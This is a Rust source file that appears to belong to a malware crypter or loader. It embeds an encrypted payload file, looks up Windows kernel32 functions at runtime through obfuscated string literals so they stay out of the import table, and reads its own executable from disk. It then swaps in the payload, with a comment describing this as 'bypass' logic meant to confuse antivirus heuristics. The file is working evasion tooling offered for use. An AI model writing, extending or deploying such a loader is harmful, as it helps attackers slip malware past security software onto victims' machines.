use crate::utils::{load_library, get_proc_address};
use rustcrypt_ct_macros::obf_lit_bytes;
use std::ptr;

pub fn load_payload() -> Result<Vec<u8>, String> {
    const ENCRYPT_DATA: &'static [u8] = include_bytes!("../../output/encrypt.bin");
    
    unsafe {
        let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;

        // Define function types
        type GetModuleFileNameAFn = unsafe extern "system" fn(isize, *mut u8, u32) -> u32;
        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *mut std::ffi::c_void, u32, u32, isize) -> isize;
        type ReadFileFn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut std::ffi::c_void) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;

        // Load functions
        let get_module_file_name_a: GetModuleFileNameAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetModuleFileNameA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load GetModuleFileNameA\0").as_slice()).to_string())?);
        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);

        // 1. Get current module filename
        let mut filename_buf = [0u8; 2048];
        let len = get_module_file_name_a(0, filename_buf.as_mut_ptr(), 2048);
        if len == 0 {
            return Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to get module filename\0").as_slice()).to_string());
        }

        // 2. Open the file
        const GENERIC_READ: u32 = 0x80000000;
        const FILE_SHARE_READ: u32 = 0x00000001;
        const OPEN_EXISTING: u32 = 3;
        const FILE_ATTRIBUTE_NORMAL: u32 = 0x80;
        
        let handle = create_file_a(
            filename_buf.as_ptr(),
            GENERIC_READ,
            FILE_SHARE_READ,
            ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0
        );

        if handle == -1 { // INVALID_HANDLE_VALUE
            return Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to open file\0").as_slice()).to_string());
        }

        // 3. Read from file into buffer
        // We allocate a buffer the size of our payload
        let mut buffer = vec![0u8; ENCRYPT_DATA.len()];
        let mut bytes_read: u32 = 0;
        
        let success = read_file(
            handle,
            buffer.as_mut_ptr(),
            ENCRYPT_DATA.len() as u32,
            &mut bytes_read,
            ptr::null_mut()
        );

        close_handle(handle);

        if success == 0 {
            return Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to read file\0").as_slice()).to_string());
        }

        // 4. Overwrite the buffer with the real payload
        // This is the "bypass" logic: confuse heuristics by mixing file IO with payload memory
        for (i, byte) in ENCRYPT_DATA.iter().enumerate() {
            if i < buffer.len() {
                buffer[i] = *byte;
            }
        }

        Ok(buffer)
    }
}
